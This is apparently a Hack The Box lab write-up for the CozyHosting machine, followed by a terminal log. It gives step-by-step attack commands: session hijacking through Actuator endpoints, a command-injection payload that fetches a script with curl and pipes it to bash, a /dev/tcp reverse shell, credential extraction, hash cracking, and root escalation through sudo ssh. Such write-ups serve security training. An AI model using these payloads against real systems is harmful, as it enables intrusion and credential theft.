@@ -1,0 +1,148 @@
+
+
+
+---
+CozyHosting
+15th August 2023 / Document No D23.100.248
+Prepared By: k1ph4ru
+Machine Author: commandercool
+Difficulty: Easy
+Classification: Official
+
+Synopsis
+CozyHosting is an easy-difficulty Linux machine featuring a Spring Boot application with exposed Actuator endpoints. Enumeration leads to session hijacking, command injection, reverse shell, credential discovery, database access, password cracking, and privilege escalation via SSH misconfiguration.
+
+Skills Required
+- Web Enumeration
+- Linux Fundamentals
+
+Skills Learned
+- Spring Boot Enumeration
+- Command Injection
+- SSH Abuse Through Misconfiguration
+
+Enumeration
+
+Nmap
+nmap -p- --min-rate=1000 -T4 10.10.11.230
+ports=$(nmap -p- --min-rate=1000 -T4 10.10.11.230 | grep '^[0-9]' | cut -d '/' -f1 | tr '\n' ',' | sed s/,$//)
+nmap -p$ports -sV 10.10.11.230
+Open ports: 22 (SSH), 80 (HTTP/nginx)
+
+HTTP
+Add domain to /etc/hosts:
+echo "10.10.11.230 cozyhosting.htb" | sudo tee -a /etc/hosts
+Fuzz for directories:
+ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt:FFUZ -u http://cozyhosting.htb/FFUZ -ic -t 100
+Discovered: index, login, admin, logout, error
+
+Spring Boot Enumeration
+ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/spring-boot.txt:FFUZ -u http://cozyhosting.htb/FFUZ -ic -t 100
+Discovered: /actuator, /actuator/mappings, /actuator/sessions
+
+Session Hijacking
+Grab session ID for kanderson from /actuator/sessions and set as cookie in browser.
+Access /admin as K. Anderson.
+
+Command Injection
+Form on /admin allows command injection via username field using ${IFS} for spaces.
+Test callback:
+test;curl${IFS}http://<YOUR_KALI_IP>:7000;
+Start HTTP server:
+python3 -m http.server 7000
+
+Reverse Shell
+Create reverse shell script:
+echo -e '#!/bin/bash\nsh -i >& /dev/tcp/<YOUR_KALI_IP>/4444 0>&1' > rev.sh
+Start listener:
+nc -lnvp 4444
+Exploit:
+test;curl${IFS}http://<YOUR_KALI_IP>:7000/rev.sh|bash;
+Upgrade shell:
+script /dev/null -c bash
+
+JAR Enumeration
+unzip -d /tmp/app cloudhosting-0.0.1.jar
+cat /tmp/app/BOOT-INF/classes/application.properties
+Credentials found:
+postgres:Vg&nvzAQ7XxR
+
+Database Access
+psql -h 127.0.0.1 -U postgres
+Password: Vg&nvzAQ7XxR
+\list
+\connect cozyhosting
+\dt
+select * from users;
+
+Password Hash Cracking
+Save hash, identify as bcrypt, crack with hashcat:
+hashcat hash_file -m 3200 /usr/share/wordlists/rockyou.txt
+Cracked password: manchesterunited
+
+User Access
+ssh josh@10.10.11.230
+Password: manchesterunited
+Obtain user flag: /home/josh/user.txt
+
+Privilege Escalation
+sudo -l
+Allowed: sudo /usr/bin/ssh as root
+Exploit:
+sudo /usr/bin/ssh -v -o PermitLocalCommand=yes -o 'LocalCommand=/bin/bash' josh@127.0.0.1
+Obtain root flag: /root/root.txt
+---
+
+
+
+
+script /dev/null -c bash
+
+┌──(kali㉿kali)-[~]
+└─$ nc -nlvp 4444
+listening on [any] 4444 ...
+connect to [10.10.14.2] from (UNKNOWN) [10.10.11.230] 49154
+sh: 0: can't access tty; job control turned off
+$ ls
+cloudhosting-0.0.1.jar
+$ whoami
+app
+$ script /dev/null -c bash
+Script started, output log file is '/dev/null'.
+app@cozyhosting:/app$ unzip -d /tmp/app cloudhosting-0.0.1.jar
+
+
+
+app@cozyhosting:/app$ cd /tmp/app/
+cd /tmp/app/
+app@cozyhosting:/tmp/app$ ls
+ls
+BOOT-INF  META-INF  org
+app@cozyhosting:/tmp/app$ cd BOOT-INF
+cd BOOT-INF
+app@cozyhosting:/tmp/app/BOOT-INF$ ls
+ls
+classes  classpath.idx  layers.idx  lib
+app@cozyhosting:/tmp/app/BOOT-INF$ ls
+ls
+classes  classpath.idx  layers.idx  lib
+app@cozyhosting:/tmp/app/BOOT-INF$ cd classes
+cd classes
+app@cozyhosting:/tmp/app/BOOT-INF/classes$ ls
+ls
+application.properties  htb  static  templates
+app@cozyhosting:/tmp/app/BOOT-INF/classes$ cat application.properties
+cat application.properties
+server.address=127.0.0.1
+server.servlet.session.timeout=5m
+management.endpoints.web.exposure.include=health,beans,env,sessions,mappings
+management.endpoint.sessions.enabled = true
+spring.datasource.driver-class-name=org.postgresql.Driver
+spring.jpa.database-platform=org.hibernate.dialect.PostgreSQLDialect
+spring.jpa.hibernate.ddl-auto=none
+spring.jpa.database=POSTGRESQL
+spring.datasource.platform=postgres
+spring.datasource.url=jdbc:postgresql://localhost:5432/cozyhosting
+spring.datasource.username=postgres
+spring.datasource.password=Vg&nvzAQ7XxR
+app@cozyhosting:/tmp/app/BOOT-INF/classes$ 
